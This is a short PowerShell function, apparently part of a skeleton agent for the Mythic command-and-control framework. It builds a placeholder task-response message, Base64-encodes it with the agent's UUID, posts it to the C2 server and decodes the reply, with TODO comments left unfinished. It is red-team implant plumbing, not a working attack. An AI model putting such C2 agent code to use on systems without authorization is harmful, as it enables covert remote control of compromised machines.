function Post-Response {
    # TODO: create task response messages

    # Create task response message
    $response = [pscustomobject]@{
        task_id = ""
        user_output = "Complete task"
        completed = "true"
    }

    # create final JSON message
    $data = [pscustomobject]@{
        action = "post_response"
        responses = @($response)
    } | ConvertTo-Json -Depth 5 -Compress

    # Display response message
    Write-Host "Response Message:`n" $data

    # Base64 checkin data
    $encoded_data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($Agent.UUID+$data))

    # send responses back to Mythic server
    $response = Post-Request -data $encoded_data

    # Decode response data
    $decoded_data = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response)).substring(36)

    # Display response message
    Write-Host "`nServer Response:`n" $decoded_data | ConvertTo-Json

    # TODO: process response messages
}


# Send back test response
Post-Response
